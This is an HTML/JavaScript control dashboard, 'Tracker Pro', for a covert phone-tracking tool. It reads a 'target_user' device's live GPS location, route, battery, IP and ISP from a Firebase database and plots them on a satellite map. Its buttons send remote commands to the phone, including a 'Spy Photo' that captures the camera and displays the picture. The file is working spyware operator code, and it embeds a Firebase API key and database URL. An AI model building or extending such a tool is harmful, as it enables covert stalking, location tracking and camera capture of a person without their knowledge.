<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Command Center</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; background: #000;}
        #map { height: 100vh; width: 100%; z-index: 1; }
        .dashboard { position: absolute; top: 15px; left: 15px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); width: 320px; max-height: 90vh; overflow-y: auto; border: 1px solid rgba(56,189,248,0.2); color: white;}
        .dashboard::-webkit-scrollbar { width: 5px; } .dashboard::-webkit-scrollbar-thumb { background: #38bdf8; border-radius: 5px; }
        .dash-header { font-size: 20px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
        .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px;}
        .data-label { color: #94a3b8; } .data-val { font-weight: bold; color: #f8fafc; text-align: right; max-width: 60%; word-wrap: break-word;}
        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 15px; line-height: 1.4;}
        .btn-group { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap;}
        .action-btn { flex: 1; min-width: 45%; padding: 10px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 12px;}
        .action-btn:active { transform: scale(0.95); }
        .ring-btn { background: #ef4444; } .msg-btn { background: #3b82f6; } 
        .photo-btn { background: #a855f7; } .geo-btn { background: #f59e0b; color: black;}
        .photo-box { margin-top: 15px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 5px; text-align: center; display: none; }
        .photo-box img { max-width: 100%; border-radius: 5px; }
        .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
    </style>
</head>
<body>

    <div class="dashboard">
        <div class="dash-header">🛰️ Tracker Pro <span id="statusBadge" style="background:#64748b; padding: 3px 8px; border-radius: 10px; font-size: 12px; color:white;">Waiting</span></div>
        <div class="address-box" id="addressUI">📍 Waiting for data...</div>
        <div class="data-row"><span class="data-label">Device Info:</span> <span class="data-val" id="deviceUI">--</span></div>
        <div class="data-row"><span class="data-label">Battery Power:</span> <span class="data-val" id="batUI">--</span></div>
        <div class="data-row"><span class="data-label">IP Address:</span> <span class="data-val" id="ipUI">--</span></div>
        <div class="data-row"><span class="data-label">Network/ISP:</span> <span class="data-val" id="ispUI">--</span></div>
        <div class="data-row"><span class="data-label">Current Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
        <div class="data-row"><span class="data-label">GPS Accuracy:</span> <span class="data-val" id="accUI">-- meters</span></div>
        
        <div class="btn-group">
            <button id="ringBtn" class="action-btn ring-btn">🔔 Ring Phone</button>
            <button id="msgBtn" class="action-btn msg-btn">💬 Send Msg</button>
            <button id="photoBtn" class="action-btn photo-btn">📸 Spy Photo</button>
            <button id="geoBtn" class="action-btn geo-btn">🛡️ Geofence: OFF</button>
        </div>

        <div class="photo-box" id="photoBox">
            <div id="photoStatus" style="font-size: 12px; color: #94a3b8; margin-bottom: 5px;">Latest Snapshot</div>
            <img id="spyImg" src="" alt="Spy Photo">
        </div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
        const app = initializeApp(firebaseConfig); const db = getDatabase(app);

        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
        const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);

        let marker = null; let accuracyRadar = null; 
        let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map);
        let lastLat = 0, lastLng = 0;

        document.getElementById('msgBtn').addEventListener('click', () => {
            const msg = prompt("Enter your message:");
            if(msg) set(ref(db, 'live_location/chat'), { message: msg, time: Date.now() });
        });
        document.getElementById('ringBtn').addEventListener('click', () => { set(ref(db, 'live_location/command'), { ringTime: Date.now() }); });
        
        document.getElementById('photoBtn').addEventListener('click', () => { 
            set(ref(db, 'live_location/command'), { photoTime: Date.now() }); 
            document.getElementById('photoBox').style.display = 'block';
            document.getElementById('photoStatus').innerText = "Request sent. Waiting for camera...";
            document.getElementById('spyImg').src = "";
        });

        function fetchAddress(lat, lng) {
            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
                .then(res => res.json())
                .then(data => { document.getElementById('addressUI').innerText = `📍 ${data.display_name}`; })
                .catch(err => console.log(err));
        }

        // Listen for Photo
        onValue(ref(db, 'live_location/photo'), (snapshot) => {
            const data = snapshot.val();
            if (data && data.image) {
                document.getElementById('photoBox').style.display = 'block';
                document.getElementById('photoStatus').innerText = "Successfully Captured!";
                document.getElementById('photoStatus').style.color = "#10b981";
                document.getElementById('spyImg').src = data.image;
            } else if (data && data.error) {
                document.getElementById('photoBox').style.display = 'block';
                document.getElementById('photoStatus').innerText = `⚠️ Camera Error: ${data.error}`;
                document.getElementById('photoStatus').style.color = "#ef4444";
            }
        });

        // Listen for Location & Info
        onValue(ref(db, 'live_location/target_user'), (snapshot) => {
            const data = snapshot.val();
            if (data && data.isOnline) {
                document.getElementById('statusBadge').style.background = '#10b981';
                document.getElementById('statusBadge').innerText = 'Live';

                document.getElementById('deviceUI').innerText = data.deviceInfo || "--";
                document.getElementById('batUI').innerText = data.battery ? `${data.battery}% ${data.charging ? '⚡' : ''}` : "--";
                document.getElementById('ipUI').innerText = data.ip_address || "Fetching...";
                document.getElementById('ispUI').innerText = data.isp || "Fetching...";

                // যদি লোকেশন এরর থাকে
                if(data.status && data.status.includes("Error")) {
                    document.getElementById('addressUI').innerText = `⚠️ ${data.status}`;
                    document.getElementById('addressUI').style.borderLeftColor = "#ef4444";
                    return; // Map update বন্ধ থাকবে, কিন্তু IP/Battery দেখাবে
                }

                // যদি লোকেশন ঠিক থাকে
                document.getElementById('addressUI').style.borderLeftColor = "#10b981";
                const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
                document.getElementById('speedUI').innerText = `${speed} km/h`;
                document.getElementById('accUI').innerText = `${Math.round(accuracy)}m`;

                if (Math.abs(lastLat - lat) > 0.0005 || lastLat === 0) {
                    fetchAddress(lat, lng);
                    lastLat = lat; lastLng = lng;
                }

                let emoji = speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️");
                let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${emoji}</div>`;
                const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });

                const latlng = [lat, lng];
                routeLine.addLatLng(latlng);

                if (!marker) { 
                    accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
                    marker = L.marker(latlng, {icon: smartIcon}).addTo(map); 
                    map.flyTo(latlng, 18); 
                } else { 
                    marker.setLatLng(latlng); marker.setIcon(smartIcon); 
                    accuracyRadar.setLatLng(latlng); accuracyRadar.setRadius(accuracy); 
                }
            } else {
                document.getElementById('statusBadge').style.background = '#ef4444';
                document.getElementById('statusBadge').innerText = 'Offline';
            }
        });
    </script>
</body>
</html>
